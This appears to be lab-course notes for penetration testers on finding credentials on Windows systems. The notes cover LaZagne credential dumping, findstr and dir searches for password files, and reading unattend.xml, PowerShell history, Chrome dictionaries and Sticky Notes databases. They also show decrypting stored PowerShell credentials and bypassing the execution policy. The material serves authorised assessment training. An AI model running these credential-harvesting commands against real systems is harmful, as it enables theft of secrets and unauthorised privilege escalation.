Credentials can unlock many doors for us during our assessments. We may find credentials during our privilege escalation enumeration that can lead directly to local admin access, grant us a foothold into the Active Directory domain environment, or even be used to escalate privileges within the domain. There are many places that we may find credentials on a system, some more obvious than others.

There are many other types of files that we may find on a local system or on network share drives that may contain credentials or additional information that can be used to escalate privileges. In an Active Directory environment, we can use a tool such as [Snaffler](https://github.com/SnaffCon/Snaffler) to crawl network share drives for interesting file extensions such as `.kdbx`, `.vmdk`, `.vdhx`, `.ppk`, etc. We may find a virtual hard drive that we can mount and extract local administrator password hashes from, an SSH private key that can be used to access other systems, or instances of users storing passwords in Excel/Word Documents, OneNote workbooks, or even the classic `passwords.txt` file.
#### Lazagne
Dump all cached credentials using [Lazagne](https://github.com/AlessandroZ/LaZagne)
```powershell
lazagne.exe all
```
##### Files
```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
findstr /spin "password" *.*
select-string -Path C:\*.txt -Pattern password

dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ *.config
```

##### **Chrome Dictionary Files**
For example, sensitive information such as passwords may be entered in an email client or a browser-based application, which underlines any words it doesn't recognize. The user may add these words to their dictionary to avoid the distracting red underline.
```powershell
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

##### Unattended Installation Files
Unattended installation files may define auto-logon settings or additional accounts to be created as part of the installation. Passwords in the unattend.xml are stored in plaintext or base64 encoded.

```powershell
where.exe /R C:\ unattend.xml
```

Example
```xml
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="specialize">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <AutoLogon>
                <Password>
                    <Value>local_4dmin_p@ss</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>2</LogonCount>
                <Username>Administrator</Username>
            </AutoLogon>
            <ComputerName>*</ComputerName>
        </component>
    </settings>
```

##### Powershell Histroy
```powershell
gc (Get-PSReadLineOption).HistorySavePath 

foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

##### PowerShell Credentials
PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API), which typically means they can only be decrypted by the same user on the same computer they were created on.

Example
```powershell
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword
```

Decrypting PowerShell Credentials
```powershell
PS C:\htb> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\htb> $credential.GetNetworkCredential().username

bob

PS C:\htb> $credential.GetNetworkCredential().password

Str0ng3ncryptedP@ss!
```

#### Sticky Notes
People often use the StickyNotes app on Windows workstations to save passwords and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

```powershell
strings plum.sqlite-wal
```
##### Viewing Sticky Notes Data Using PowerShell
This can also be done with PowerShell using the [PSSQLite module](https://github.com/RamblingCookieMonster/PSSQLite)
```powershell
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A

PS C:\htb> cd .\PSSQLite\
PS C:\htb> Import-Module .\PSSQLite.psd1
PS C:\htb> $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
PS C:\htb> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
